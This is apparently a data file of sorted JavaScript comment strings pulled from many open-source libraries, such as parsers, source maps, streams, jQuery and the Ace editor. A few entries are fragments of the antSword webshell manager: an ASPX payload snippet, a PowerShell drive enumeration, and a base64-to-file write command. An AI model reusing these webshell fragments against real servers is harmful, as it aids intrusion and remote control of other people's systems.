"// Unbind all events (on this namespace, if provided) for the element"
"// Unbuffered parsers are supposed to emit response early,"
"// Underscore templating handles arbitrary delimiters, preserves whitespace,"
"// Unfortunately we can't elegantly reuse isFunction and isString,"
"// Unhandled types below. If encountered, nodes of these types should"
"// Universal Module Definition (UMD) to support AMD, CommonJS/Node.js,"
"// Unless errors are allowed to bubble, catch and return them"
"// Unless we *know* we can detect duplicates, assume their presence"
"// Unlike Gaia's implementation, the callback function is passed the value,"
"// Unlike localStorage, you can store non-strings."
"// Unlike path.node and path.value, which are synonyms because path.node"
"// Unpack sign, exponent, fraction"
"// Unreachable since it threw ""unterminated regular expression"" error before."
"// Unused, for backwards compatibility only"
"// Update scale, tolerating zero or NaN from tween.cur()"
"// Use (key + "" "") to avoid collision with native prototype properties (see Issue #157)"
"// Use .is( "":disabled"" ) so that fieldset[disabled] works"
"// Use a property on the element directly when it is not a DOM element,"
"// Use case: for some types of streams, you'll need to provide ""file""-related information manually."
"// Use defaultValue in place of getAttribute(""value"")"
"// Use our own decoder, it has the same interface."
"// Use the ""evaluate"" delimiter to execute JavaScript and generate HTML."
"// Use the ""interpolate"" delimiter to create a compiled template."
"// Use the ES template literal delimiter as an ""interpolate"" delimiter."
"// Use the HTML ""escape"" delimiter to escape data property values."
"// Use the internal `print` function in ""evaluate"" delimiters."
"// Use the more specific Def (vDef) to perform the deep check, but"
"// Use the original stack trace, so we can see a helpful line number."
"// Used for SOCKS4 userId auth, and SOCKS5 user/pass auth in conjunction with password."
"// Used to define a custom driver, shared across all instances of"
"// Used to read character escape sequences ('\x', '\u', '\U')."
"// Using Object.keys here, or else the vanilla for-in loop makes IE8 go into an"
"// Usually the current owner is the offender, but if it accepts children as a"
"// VALUE=""new"
"// Values: >=  0 -> it is a normal char. Write the value (if <=256 then 1 byte, if <=65536 then 2 bytes, etc.)."
"// VariableDeclarator is typed as Statement,"
"// Variations, in roughly number of defined chars:"
"// Version 1.1: new BigInteger(""0"", 10) returns ""proper"" zero"
"// Version 1.2: square() API, isProbablePrime fix"
"// Version has a -pre, but it's not one of the ones we like."
"// Visitor methods receive a single argument, a NodePath object"
"// Visual Hebrew - ""ISO-8859-8"" - backwards text - Words and sentences are"
"// W3C CSS3 specs: element whose ""class"" attribute has been assigned a"
"// WALK: dos { source: 'a.js', line: 1, column: 2, name: null }"
"// WALK: quatro { source: 'c.js', line: 5, column: 6, name: null }"
"// WALK: tres { source: 'a.js', line: 1, column: 2, name: null }"
"// WALK: uno { source: 'b.js', line: 3, column: 4, name: null }"
"// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied."
"// Wait 5 seconds for the server to start sending,"
"// Wait for the socket's `connect` event, so that this `callback()`"
"// We accept only strings, so we don't need to decode them."
"// We add the code from ""lastMapping"" to ""mapping"":"
"// We can accept data for non-element nodes in modern browsers,"
"// We can't cloneNode fragments that contain checked, in WebKit"
"// We can't hang onto stmtPath outside of this function, because"
"// We can't set arbitrary data on XML nodes, so they don't benefit from combinator caching"
"// We can't use value directly because for dates it is already string in this function (date.toJSON was already called), so we use this"
"// We create tags in the namespace of their parent container, except HTML"
"// We did not find an exact match, return the next closest one"
"// We differ from mz/fs in that we still ship the old, broken, fs.exists()"
"// We do not handle characters based on the original encoding string, but"
"// We don't have any data stored on the element,"
"// We have a method named auth, which is completely different from the http.request"
"// We have found either the exact element, or the next-closest element than"
"// We have the first key, return it if that's what they"
"// We have to disable the capture rejections mechanism, otherwise"
"// We know that the body is empty (unfortunately, this check does not cover chunked encoding)"
"// We know that we're about to delete this one, and also"
"// We may want to force all options to be persisted including defaults, not just the ones passed the index creation function"
"// We mimic PouchDB here; just UA test for Safari (which, as of"
"// We need to handle both cases, so we use ...args"
"// We need to remember the position of ""remainingLines"""
"// We need to sort the color stops in ascending order by offset,"
"// We only end up here once we got ENOTEMPTY at least once, and"
"// We prevent Mocha from catching the exception we throw on purpose by remembering all current handlers, remove them and register them back after test ends"
"// We reject the callback outright for now, but"
"// We rely exclusively on `insertBefore(node, null)` instead of also using"
"// We tried really hard, but the data doesn't exist."
"// We use a regex to parse the ""name-value-pair"" part of S5.2"
"// We""re already in our own window.close()."
"// We're not performing DNS queries, so this shouldn't match."
"// Webkit, Firefox, IE9+"
"// Weird formatting, huh?"
"// Weird formatting, huh?"","
"// When `locations` is on, `loc` properties holding objects with"
"// When `locations` is on, you can pass this to record the source"
"// When `prop` is a ""plain"" object"
"// When a client connects to the newly bound port on the SOCKS proxy, this event is fired."
"// When aOriginal is truthy but has empty values for .line and .column,"
"// When colors attribute is used, the meanings of opacity and o:opacity2"
"// When customizing `templateSettings`, if you don't want to define an"
"// When data is initially created, via (""key"", ""val"") signature,"
"// When enabled, a return at the top level is not considered an"
"// When enabled, await identifiers are allowed to appear at the top-level scope,"
"// When enabled, hashbang directive in the beginning of file"
"// When enabled, import/export statements are not constrained to"
"// When enabled, parenthesized expressions are represented by"
"// When enabled, super identifiers are not constrained to"
"// When found, cache indexes on `parent` and break"
"// When implementing your own store, this SHOULD retain the order too"
"// When it exited from the outermost class definition, all used private names must be declared."
"// When mounting, calls to `setState` by `componentWillMount` will set"
"// When multiple DOM elements are in the original set, the resulting set will"
"// When node is a comment, we set node.loc.indent to"
"// When the AJAX state changes, save the photo locally."
"// When the Group prober receives a positive identification from any prober,"
"// When the SOCKS proxy has bound a new port and started listening, this event is fired."
"// When the UDP relay is established, this event is fired and includes the UDP relay port to send data to on the proxy server."
"// When the `locations` option is on, two more parameters are"
"// When the fn is first in line for all its paths, it"
"// When the following conditions are all true,"
"// When the key is not a string, or both a key and value"
"// When the writable side finishes, then flush out anything remaining."
"// When there are more than three length categories, an outer"
"// When there is no exact match, BasicSourceMapConsumer.prototype._findMapping"
"// When there's only a node name, then the node type is forced to be the"
"// When true, call console.time() before and .timeEnd() after each top-level"
"// When used with strings, lexicographical order is used"
"// When using BIND, the destination should be the remote client that is expected to connect to the SOCKS proxy. Using 0.0.0.0 makes the Proxy accept any incoming connection on that port."
"// When using associate, the destination should be the remote client that is expected to send UDP packets to the proxy server to be forwarded. This should be your local ip, or optionally the wildcard address (0.0.0.0)  UDP Client <-> Proxy <-> UDP Client"
"// When using node-qunit on the command line, the module is imported as is and we need to point at"
"// When we check, schedule the next check for MAX_BUFFER_LENGTH - (max(buffer lengths)),"
"// When we get here, we've got the nth key."
"// When we pass the MAX_BUFFER_LENGTH position, start checking for buffer overruns."
"// When we print trailing comments as leading comments, we don't"
"// When we reached the correct line, we add code until we"
"// When writing files on Windows, translate the characters to their"
"// Whether to cache exact response, or to html cache contents after scripts execute"
"// While there are 4 items in localStorage,"
"// While we plan to keep most of the API, the actual format of measurements"
"// Wildcard, matches all types:"
"// Will return { success: false, error: <an explanatory string> }"
"// Will return { success: true, error: undefined }"
"// Will set `this.props`, `this.state` and `this.context`."
"// Windows doesn't report a useful nlink, so we just never reuse entries"
"// Windows may throw UNKNOWN error. If dest already exists,"
"// Windows, which does not have useful nlink values), then the unlink"
"// With pos and sticky, in a loop"
"// With this query, candidates are always returned in the order 4, 5, 'abc' so it's always the last one which fails"
"// With { $pop: { fruits: -1 } }, it would have been ['orange', 'pear']"
"// Without `__proto__` support, this module will need to add properties to a function."
"// Without this first invariant, passing a non-DOM-component triggers the next"
"// Workaround erroneous numeric interpretation of +""0x"""
"// Writable ctor is applied to Duplexes, though they're not"
"// Writable ctor is applied to Duplexes, too."
"// Write '&', then go to base64 mode."
"// Write '-', then go to direct mode."
"// Write an error, then current char."
"// Write failed, use old version"
"// Write the character to buffer, handling higher planes using surrogate pair."
"// XXX This is different on 0.10, because SSL is strict by default"
"// Yes, Virginia, circular definitions are permitted."
"// Yes, you can define arbitrary helper methods."
"// You can mix normal queries, comparison queries and logical operators"
"// You can skew to be more insertive or deletive, to test all cases"
"// You can sort on one field, then another, and so on like this:"
"// You can verify this in e.g. Firefox or Internet Explorer, which do a good job with Web IDL compliance."
"// You lost the ""data.red"" field which is probably not the intended behavior"
"// Z:String=Request.Item[""${arg2}""].substr(#randomPrefix#);var B:byte[]=new byte[Z.Length/2];for(var"
"// Zero or more digits, followed by a letter or hyphen, and then zero or"
"// [ ""my-cool-lib.clj"" ]"
"// [ 'http://example.com/www/js/one.js',"
"// [ 'type', 'id', 'params', 'body', 'generator', 'expression',"
"// [ 1, ""foo"" ]"
"// [ ['foo', 'A'], ['bar', 'b'], ['bar', 'B'] ]"
"// [ { line: 2,"
"// [""a"" + ""b""]"
"// [""nonEnumerableProperty""]"
"// ['asp','aspx','php','custom'].map((t)=>{"
"// ['b','u','f','f','e','r']"
"// ['bar', 1, 2, 3, 'foo']"
"// ['edit', 'del'].map(this.toolbar::this.toolbar.disableItem); this.parse();"
"// ['edit', 'del'].map(this.toolbar::this.toolbar.disableItem);"
"// ['foofoo', 6, 4, 2, 'barbar']"
"// ['hi', [null, [42]], {k: true}]"
"// ['hi', false]"
"// [1, 2, 3]"
"// [1,2,3]"
"// [127, 0, 0, 1] at offset 64"
"// [2, 200] (alerted)"
"// [System.IO.DriveInfo]::GetDrives()|Where-Object{$_.DriveType -eq 3}|ForEach-Object{$ADRIVERS+=$_.Name.substring(0,2)};"
"// [abstract syntax tree walker][walk], defined in other files."
"// [attr] [attr=value] [attr=""value""] [attr='value'] and !=, *=, ~=, |=, ^=, $="
"// [end of line] [last word of second line] ... etc' """
"// [semi-standardized][range] `range` property holding a `[start,"
"// [{key: 'key1', value: 'value1', domain: ""www.google.com"", ...}, ...]"
"// [{name:""123.txt"", size: 1234}]"
"// \' \"""
"// \\{\\{\\{)"",foldingStopMarker:""^\\s*(\\}|// \\}\\}\\}$)"",name:""Vala"",scopeName:""source.vala""},r.inherits(s,i),t.ValaHighlightRules=s}),ace.define(""ace/mode/folding/cstyle"",[""require"",""exports"",""module"",""ace/lib/oop"",""ace/range"",""ace/mode/folding/fold_mode""],function(e,t,n){""use strict"";var r=e(""../../lib/oop""),i=e(""../../range"").Range,s=e(""./fold_mode"").FoldMode,o=t.FoldMode=function(e){e&&(this.foldingStartMarker=new RegExp(this.foldingStartMarker.source.replace(/\|[^|]*?$/,""|""+e.start)),this.foldingStopMarker=new RegExp(this.foldingStopMarker.source.replace(/\|[^|]*?$/,""|""+e.end)))};r.inherits(o,s),function(){this.foldingStartMarker=/([\{\[\(])[^\}\]\)]*$|^\s*(\/\*)/,this.foldingStopMarker=/^[^\[\{\(]*([\}\]\)])|^[\s\*]*(\*\/)/,this.singleLineBlockCommentRe=/^\s*(\/\*).*\*\/\s*$/,this.tripleStarBlockCommentRe=/^\s*(\/\*\*\*).*\*\/\s*$/,this.startRegionRe=/^\s*(\/\*|\/\/)#?region\b/,this._getFoldWidgetBase=this.getFoldWidget,this.getFoldWidget=function(e,t,n){var r=e.getLine(n);if(this.singleLineBlockCommentRe.test(r)&&!this.startRegionRe.test(r)&&!this.tripleStarBlockCommentRe.test(r))return"""";var i=this._getFoldWidgetBase(e,t,n);return!i&&this.startRegionRe.test(r)?""start"":i},this.getFoldWidgetRange=function(e,t,n,r){var i=e.getLine(n);if(this.startRegionRe.test(i))return this.getCommentRegionBlock(e,i,n);var s=i.match(this.foldingStartMarker);if(s){var o=s.index;if(s[1])return this.openingBracketBlock(e,s[1],n,o);var u=e.getCommentFoldRange(n,o+s[0].length,1);return u&&!u.isMultiLine()&&(r?u=this.getSectionRange(e,n):t!=""all""&&(u=null)),u}if(t===""markbegin"")return;var s=i.match(this.foldingStopMarker);if(s){var o=s.index+s[0].length;return s[1]?this.closingBracketBlock(e,s[1],n,o):e.getCommentFoldRange(n,o,-1)}},this.getSectionRange=function(e,t){var n=e.getLine(t),r=n.search(/\S/),s=t,o=n.length;t+=1;var u=t,a=e.getLength();while(++t<a){n=e.getLine(t);var f=n.search(/\S/);if(f===-1)continue;if(r>f)break;var l=this.getFoldWidgetRange(e,""all"",t);if(l){if(l.start.row<=s)break;if(l.isMultiLine())t=l.end.row;else if(r==f)break}u=t}return new i(s,o,u,e.getLine(u).length)},this.getCommentRegionBlock=function(e,t,n){var r=t.search(/\s*$/),s=e.getLength(),o=n,u=/^\s*(?:\/\*|\/\/|--)#?(end)?region\b/,a=1;while(++n<s){t=e.getLine(n);var f=u.exec(t);if(!f)continue;f[1]?a--:a++;if(!a)break}var l=n;if(l>o)return new i(o,r,l,t.length)}}.call(o.prototype)}),ace.define(""ace/mode/matching_brace_outdent"",[""require"",""exports"",""module"",""ace/range""],function(e,t,n){""use strict"";var r=e(""../range"").Range,i=function(){};(function(){this.checkOutdent=function(e,t){return/^\s+$/.test(e)?/^\s*\}/.test(t):!1},this.autoOutdent=function(e,t){var n=e.getLine(t),i=n.match(/^(\s*\})/);if(!i)return 0;var s=i[1].length,o=e.findMatchingBracket({row:t,column:s});if(!o||o.row==t)return 0;var u=this.$getIndent(e.getLine(o.row));e.replace(new r(t,0,t,s-1),u)},this.$getIndent=function(e){return e.match(/^\s*/)[0]}}).call(i.prototype),t.MatchingBraceOutdent=i}),ace.define(""ace/mode/vala"",[""require"",""exports"",""module"",""ace/lib/oop"",""ace/mode/text"",""ace/tokenizer"",""ace/mode/vala_highlight_rules"",""ace/mode/folding/cstyle"",""ace/mode/behaviour/cstyle"",""ace/mode/folding/cstyle"",""ace/mode/matching_brace_outdent""],function(e,t,n){""use strict"";var r=e(""../lib/oop""),i=e(""./text"").Mode,s=e(""../tokenizer"").Tokenizer,o=e(""./vala_highlight_rules"").ValaHighlightRules,u=e(""./folding/cstyle"").FoldMode,a=e(""./behaviour/cstyle"").CstyleBehaviour,f=e(""./folding/cstyle"").FoldMode,l=e(""./matching_brace_outdent"").MatchingBraceOutdent,c=function(){this.HighlightRules=o,this.$outdent=new l,this.$behaviour=new a,this.foldingRules=new f};r.inherits(c,i),function(){this.lineCommentStart=""//"",this.blockComment={start:""/*"",end:""*/""},this.getNextLineIndent=function(e,t,n){var r=this.$getIndent(t),i=this.getTokenizer().getLineTokens(t,e),s=i.tokens,o=i.state;if(s.length&&s[s.length-1].type==""comment"")return r;if(e==""start""||e==""no_regex""){var u=t.match(/^.*(?:\bcase\b.*:|[\{\(\[])\s*$/);u&&(r+=n)}else if(e==""doc-start""){if(o==""start""||o==""no_regex"")return"""";var u=t.match(/^\s*(\/?)\*/);u&&(u[1]&&(r+="" ""),r+=""* "")}return r},this.checkOutdent=function(e,t,n){return this.$outdent.checkOutdent(t,n)},this.autoOutdent=function(e,t,n){this.$outdent.autoOutdent(t,n)},this.$id=""ace/mode/vala""}.call(c.prototype),t.Mode=c});                (function() {"
"// \n, \r"
"// \p{Any} matches a code unit. To match any code point via surrogate pairs, use (?:[\0-\uD7FF\uDC00-\uFFFF]|[\uD800-\uDBFF][\uDC00-\uDFFF]|[\uD800-\uDBFF])"
"// ^ --> * (any, kinda silly)"
"// ^, $"
"// ^1.2, ^1.2.x --> >=1.2.0 <2.0.0-0"
"// ^2, ^2.x, ^2.x.x --> >=2.0.0 <3.0.0-0"
"// ^2.0, ^2.0.x --> >=2.0.0 <3.0.0-0"
"// _: `try { [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('#{base64::content}'))|New-Item -ItemType File -Force -Path '#{path}' -ErrorAction Stop|Out-Null;'1';}catch{'0';}`.replace(/\n\s+/g, ''),"
"// _data[i] = antSword.noxss(new Buffer(_data[i], ""base64"").toString(), false);"
"// _processChunk tries to .close() the native handle after it's done, so we"
"// _read(n) is called, it transforms the queued up data, calling the"
"// `${data['type']}:\/\/${data['user']}@${data['host']}`,"
"// `<!--`, an XML-style comment that should be interpreted as a line comment"
"// `NaN`, `+Infinity`, or `-Infinity`"
"// `NaN`s are equivalent, but non-reflexive. An `egal` comparison is performed for"
"// `ReactServerRendering`), but server-side uses"
"// `Selection.isCollapsed` is available natively, but IE sometimes gets"
"// `\` breaks the `(?:)` wrapper. For subpatterns provided as regexes, it dies on"
"// `_originalMappings` getters respectively, and we only parse the mappings"
"// `foo \\""bar\\""` (foo, literal slash, ""bar"", literal slash)"
"// `form.getElementsByName`, but that will only return direct children"
"// `i` is now the count of elements visited above, and adding it to `matchedCount`"
"// `i` was supposed to wrap around from `out` to `0`,"
"// `if (foo) /blah/.exec(foo)`, where looking at the previous token"
"// `join('http://', 'www.example.com')`"
"// `join(foo, '//www.example.org')`"
"// `keyCode` value, almost all function keys have a universal value."
"// `len` is used for character escape sequences. In that case, disallow separators."
"// `maybeLegacyOctalNumericLiteral` is true if it doesn't have prefix (0x,0o,0b)"
"// `new`, or an expression wrapped in punctuation like `()`, `[]`,"
"// `nextIndex` will increment for each child in `nextChildren`, but"
"// `null` for undefined keys, even though its getter/setter API"
"// `onTrailingComma` is similar to `onInsertedSemicolon`, but for"
"// `port` on `http.RequestOptions` can be a string or undefined,"
"// `program` argument.  If present, the statements will be appended"
"// `propValue` being instance of, say, date/regexp, pass the 'object'"
"// `setAttribute` with objects becomes only `[object]` in IE8/9,"
"// `socket` is actually an `http.Agent` instance, so"
"// `start` and `end` properties (directly on the node, rather than"
"// `start` and `end` properties in `{line, column}` form (with"
"// `text` is the content of the comment, and `start` and `end` are"
"// `type` here could be undefined if, for example, the command has a"
"// `whatever.should = someValue` actually set `someValue`, which is"
"// `yield`, but this isn't that kind of yield"
"// a %x2F (""/"") character, output %x2F (""/"") and skip the remaining steps."
"// a - IPv4, b - IPv6"
"// a callback, as shown below:"
"// a complex range should be ignored.  so if we saw a non-null range,"
"// a flag to be able to tell if the onwrite cb is called immediately,"
"// a flag to know if we're processing previously buffered items, which"
"// a function modifier, and we should rewind and interpret it as a"
"// a generic version of eachOf which can handle array, object, and iterator cases."
"// a global extended header, because that's weird."
"// a nextTick recursion warning, but that's not so bad."
"// a parameter.  This mode is still somewhat supported, which is why"
"// a prefix that fits, or we run out of components to remove."
"// a redirect), so when that happens we need to potentially re-set the proxy"
"// a regular expression, and on Chrome the two are about on par."
"// a single UTF-8 replacement character ('\ufffd'), to match v8's UTF-8 decoding"
"// a write() returns false, or does a write() with more than one entry"
"// a zlib stream might take multiple plain-text writes(), and then"
"// a, b"
"// a, b, and c equal 1, 2, and 3"
"// a. If exports contains any index property keys, as defined in ECMA-262 6.1.7 Array Index, throw an Invalid Package Configuration error."
"// a. If packageSpecifier does not contain a ""/"" separator, then"
"// a. If pattern is false, subpath has non-zero length and target does not end with ""/"", throw an Invalid Module Specifier error."
"// a. If pattern is true, then"
"// a. If target.length is zero, return null."
"// a. If the file at RESOLVED_PATH exists, load RESOLVED_PATH as its extension"
"// a. LOAD_PACKAGE_EXPORTS(X, DIR)"
"// a. LOAD_PACKAGE_IMPORTS(X, dirname(Y))"
"// a. Let matchKey be the string ""./"" concatenated with subpath."
"// a. Let packageURL be the URL resolution of ""node_modules/"" concatenated with packageSpecifier, relative to parentURL."
"// a. Let patternBase be the substring of expansionKey up to but excluding the first ""*"" character."
"// a. Parse X/package.json, and look for ""main"" field."
"// a. Return the string ""node:"" concatenated with packageSpecifier."
"// a. Set packageName to the substring of packageSpecifier until the first ""/"" separator or the end of the string."
"// a. if PARTS[I] = ""node_modules"" CONTINUE"
"// about authorized use, other limits, etc."
"// above, but since this is a situation where React won't take over"
"// action on item selection (nothing, activate, select, combo, hide, function(){})"
"// action, add listener, listener list, final state"
"// actions that shouldn't happen until ""later"" should generally also"
"// add ""cache validation"" headers if a `cache` was provided"
"// add a *lot* of extra cruft to that file, making it less readable"
"// add the store type, to make humans happy:"
"// adding it to the listeners, first emit ""newListener""."
"// adding it to the listeners, first emit ""newListeners""."
"// adding punctuation marks, numbers and English text to visual text is"
"// adler32 is not cryptographically strong, and is only used to sanity check that"
"// after 53 bits, JavaScript's Number type (IEEE 754 double) can't store individual integers anymore."
"// after each call, these handlers start piling up."
"// again, intentionally not ==="
"// akin to a jigsaw puzzle, we simply never set it to be sure."
"// alert(""...eval?...really?..."");eval('foo');"
"// alias for cwd:'some-dir', also ok"
"// alias, so that JSLint does not complain."
"// all but the last one, so that XMLDefaultDeclaration (for"
"// all of them listed here, just pick and choose what you want"
"// all of which are managed, created, fed data, inquired and deleted by the"
"// allocate the first CorkedRequest, there is always"
"// allow .., absolute path entries, and unpacking through symlinks"
"// allow <!-- blah -- bloo --> in non-strict mode,"
"// allow function declarations in branches, but only in non-strict mode"
"// allow to cancel ""leftover"" jobs upon error"
"// allowRunningInsecureContent: true, sandbox: false,"
"// allowing you to adjust arguments, run code before and after, and"
"// already added our getter or it is not a named property (e.g. ""addEventListener"")"
"// already exist, since every other test makes things in there."
"// already have a bunch of data in the buffer, then just trigger"
"// already. If so, then hooray!  If not, then something is borked."
"// also, 1.0.0alpha1 (prerelease without the hyphen) which is pretty"
"// also, don't include the same comparator more than once"
"// also, that means that the chunk and cb are currently"
"// always -- see shouldComponentUpdate()) will reconcile children, reconcile"
"// always be in object mode, as far as Minipass is concerned"
"// am1: use a single mult and divide to get the high bits,"
"// am: Compute w_j += (x*this_i), propagate carries,"
"// amount of input, and end up with a very large amount of output.  In"
"// an `originalValue` property. Here, when we detect this, we"
"// an archive can set properties on the extraction directory, but it"
"// an array. `close` is the token type that ends the list, and"
"// an assignment, then bindingType should be set to BIND_NONE. Otherwise, it"
"// an attribute.  attr has ""name"" and ""value"""
"// an early error. Therefore, we need the third state, firstCoverInitializedNameError, to track the"
"// an empty buffer, skipping the buffer/decoder dance"
"// an encoding is specified, or buffers/objects if not."
"// an error, then that'll put the hurt on the whole operation.  If you"
"// an off. When this option has the value ""never"", reserved words"
"// and '' means ""any version"", just remove the *s entirely."
"// and end() return `this` as well, so you can"
"// and ensures independent validity, lest an unescaped `(`, `)`, `[`, or trailing"
"// and escape the comment, thus injecting code that gets evaled."
"// and for services with simple hosts, aws4 can infer the host from service and region:"
"// and if you're using us-east-1, it's the default:"
"// and isn't fraction part nor exponent part. In that case, if the first digit"
"// and since driver() and supports() are not defered (are sync),"
"// and the API calls in the tests occur first in every test, such that the"
"// and the legacy (string, encoding, offset, length)"
"// and the node has no children for the comment to lead or trail,"
"// and triggering this behavior. In this case, we return our"
"// and we are going to proceed with show, we should pretend to be hidden"
"// and we expected it to be a SourceLocation or a Position, it was"
"// and we're not in objectMode, then that's an error."
"// and, *if* the syntactic construct they handle is present, wrap"
"// another read() call => stack overflow.  This way, it might trigger"
"// anotherScript.js will have the ability to read `window.__myObject`, even"
"// answer', {"
"// antSword[""core""][t].prototype.encoders.map((e)=>{     encoders[t].push(e);"
"// any 2xx response is a ""success"" code"
"// any actions that shouldn't happen until ""later"" should generally also"
"// any error other than ENOTDIR or ENOTSUP means it's not readable,"
"// any new configuration values. Instead, we return an error."
"// anything as JavaScript, repairing syntax error the best it can."
"// appearing at the top of the program, and an import.meta expression"
"// apply env-specific formatting (colors, etc.)"
"// apply source map ""mapStep1"" to ""mapStep2"""
"// arbitrary, and perhaps not very meaningful."
"// are both identifier characters, they must be separated by a space,"
"// are expected for a FunctionExpression, types.getFieldNames knows:"
"// are fixed by this utility function. Specifically, if it decides to"
"// are intended to be compressed and deduplicated, the TypeScript compiler"
"// are lazily instantiated, accessed via the `_generatedMappings` and"
"// are not correctly handled at this point, and will trigger an assertion"
"// are not repeated, and it does not try to bind the words `eval`"
"// are read by FileReader as null, or by ajax as 404s."
"// are specified, set or extend (existing objects) with either:"
"// arguments passed either before or after the %c, so we need to"
"// arguments pre-filled, without changing its dynamic `this` context."
"// arguments, an AssertionError will be thrown."
"// arguments, as named by .build(""name"", ""program"") above."
"// array === [1, 2, 3]"
"// array and perform any updates enqueued by mount-ready handlers (i.e.,"
"// array expressions, functions calls and function definitions pass true"
"// array into two pieces and (2) recurse on each half. If it is not, this is"
"// array or a string.  if an array, flatten it."
"// array, so the `dom` array can be inserted without removing any"
"// array. We'll iterate several time, as every iteration might add new items"
"// arrays are objects, NodeLists are functions in Safari"
"// as a consequence of this design decision, it's possible to have ambiguous zip file metadata if a coherent eocdr was in the comment."
"// as an upper bound, no need to add the 27 hours timezone offset)"
"// as long as we're bounds checking the result of this function against the total file size,"
"// as nice as a meta field, but it's the only sane thing we can do whilst"
"// as object ""{}"" and the regular expression would be lost."
"// as part of the ""key"" for the LRU cache"
"// as rare as required, but as often as necessary to ensure never crossing this bound."
"// as such, it cannot ever support astral-plane characters (10000-EFFFF)"
"// as the .loc.end of the preceding quasi element, but some parsers"
"// as the name of the database because it's not the one we'll operate on,"
"// as the size in the tarball, even though Directory entries are"
"// assign a Date to this response for the ""Cache-Control"" delta calculation"
"// assumes a,this >= 0"
"// assumes correct ""an+b"" format, ""b"" before ""a"" to keep ""n"" values"
"// asyncStorage API, which is based on localStorage and upon which"
"// at some point in the future, we may want to do the opposite!"
"// at the _exact_ same time, they should be close enough to be able to calculate"
"// at the end of this loop, we've incremented bytesRead and this.remain"
"// at the top level, you can ommit surrounding delimiters"
"// at this point there are no more values, delete the property"
"// at this point, found no resolution, just truncate"
"// at this point, no one needed a drain, so we just ran out of data"
"// at this point, the user has presumably seen the 'readable' event,"
"// at this point, we are guaranteed to have removed all the kids."
"// attempt to find the ""entry"" with a matching ""name"""
"// attempt to get ""Content-Length"" header"
"// attr=""value"""
"// attribute name is specified, read *all* HTML5 `data-*` attributes in this"
"// attribute value, terminate these steps."
"// attribute.  If the markup does not start with a < character, it"
"// auth option.  If we don't remove it, we're gonna have a bad time."
"// autoFocus: HAS_BOOLEAN_VALUE,"
"// automatically. This includes types that are not subtypes of Node,"
"// avoid scope creep, the keys array can then be collected"
"// await cb(_ => client.connect(opts, _));"
"// awesome, because it means you will never again make the"
"// aws4 will sign an options object as you'd pass to http.request, with an AWS service and region"
"// aws4.sign() will sign and modify these options, ready to pass to http.request"
"// b. DIR = path join(PARTS[0 .. I] + ""node_modules"")"
"// b. For each item targetValue in target, do"
"// b. For each property p of target, in object insertion order as,"
"// b. If ""main"" is a falsy value, GOTO 2."
"// b. If exports is a String or Array, or an Object containing no keys starting with ""."", then"
"// b. If matchKey starts with but is not equal to patternBase, then"
"// b. If pjson.imports is a non-null Object, then"
"// b. If target does not start with ""./"", then"
"// b. Let resolved be the result of PACKAGE_IMPORTS_EXPORTS_RESOLVE( matchKey, exports, packageURL, false, conditions)."
"// b. Let resolved be the result of PACKAGE_TARGET_RESOLVE( packageURL, targetValue, subpath, pattern, internal, conditions)."
"// b. Return PACKAGE_RESOLVE(target + subpath, packageURL + ""/"")."
"// b. Return the result of PACKAGE_TARGET_RESOLVE(packageURL, target, """", false, isImports, conditions)."
"// b. Set packageName to the substring of packageSpecifier until the second ""/"" separator or the end of the string."
"// backoff. wait longer than the total time we've been retrying, but only"
"// backward compatibility, the user is explicitly"
"// base path that will be used to resolve all patterns (eg. files, exclude)"
"// be a valid example of a transform, of course.)"
"// be either 3, or 5, or 6. This influences support for strict"
"// be flexible about parameters, sometimes we call html(),"
"// be followed by an expression (thus, a slash after them would be a"
"// be here, but we assume that it has cleared its _pendingCallbacks and"
"// be in *reverse* order of the original elements as well, with duplicates"
"// be made configurable somehow.  But until then, YAGNI."
"// be moved. Otherwise, we do not need to move it because a child will be"
"// be on windows, but want \ to be considered a path separator."
"// be optional in the Babel/Acorn AST format, but it must be optional"
"// be restored to its original state after the callback is finished, so it"
"// be the earliest representable date and time."""
"// be used to print ""new"" nodes, it's tempting to think we"
"// because node will emit a faux-error ""socket hang up"""
"// because rootMarkup is retrieved from the DOM, various normalizations"
"// because the new nodes might not be entirely new, but merely"
"// because you cannot properly cancel a loading SWF file without breaking browser load references, also obj.onreadystatechange doesn't work"
"// been prevented above, so ignore this for coverage."
"// been sorted, you have the option of using a faster algorithm."
"// before it again, this node must be the closest preceding"
"// before it was completed, crash & burn"
"// before the second keystroke). Other input methods (e.g., paste) seem to"
"// before, it will be created here and cached in the future:"
"// being equal to the identifier C,"
"// being interpreted""."
"// being processed, so move the buffer counter past them."
"// between the tied comments. In order to qualify as leading, a"
"// binary operators with a very low precedence, that should result"
"// binding identifier for ImportSpecifier nodes, but .id for"
"// bit9, may lock files for up to a minute, causing npm package install"
"// block, it means wrapper.initialize threw."
"// body...}\n	};\n# Function\nsnippet fun\n	function ${1?:function_name}(${2:argument}) {\n		${3:// body...}\n	}\n# Anonymous Function\nregex /((=)\\s*|(:)\\s*|(\\()|\\b)/f/(\\))?/\nsnippet f\n	function${M1?: ${1:functionName}}($2) {\n		${0:$TM_SELECTED_TEXT}\n	}${M2?;}${M3?,}${M4?)}\n# Immediate function\ntrigger \\(?f\\(\nendTrigger \\)?\nsnippet f(\n	(function(${1}) {\n		${0:${TM_SELECTED_TEXT:/* code */}}\n	}(${1}));\n# if\nsnippet if\n	if (${1:true}) {\n		${0}\n	}\n# if ... else\nsnippet ife\n	if (${1:true}) {\n		${2}\n	} else {\n		${0}\n	}\n# tertiary conditional\nsnippet ter\n	${1:/* condition */} ? ${2:a} : ${3:b}\n# switch\nsnippet switch\n	switch (${1:expression}) {\n		case \'${3:case}\':\n			${4:// code}\n			break;\n		${5}\n		default:\n			${2:// code}\n	}\n# case\nsnippet case\n	case \'${1:case}\':\n		${2:// code}\n		break;\n	${3}\n\n# while (...) {...}\nsnippet wh\n	while (${1:/* condition */}) {\n		${0:/* code */}\n	}\n# try\nsnippet try\n	try {\n		${0:/* code */}\n	} catch (e) {}\n# do...while\nsnippet do\n	do {\n		${2:/* code */}\n	} while (${1:/* condition */});\n# Object Method\nsnippet :f\nregex /([,{[])|^\\s*/:f/\n	${1:method_name}: function(${2:attribute}) {\n		${0}\n	}${3:,}\n# setTimeout function\nsnippet setTimeout\nregex /\\b/st|timeout|setTimeo?u?t?/\n	setTimeout(function() {${3:$TM_SELECTED_TEXT}}, ${1:10});\n# Get Elements\nsnippet gett\n	getElementsBy${1:TagName}(\'${2}\')${3}\n# Get Element\nsnippet get\n	getElementBy${1:Id}(\'${2}\')${3}\n# 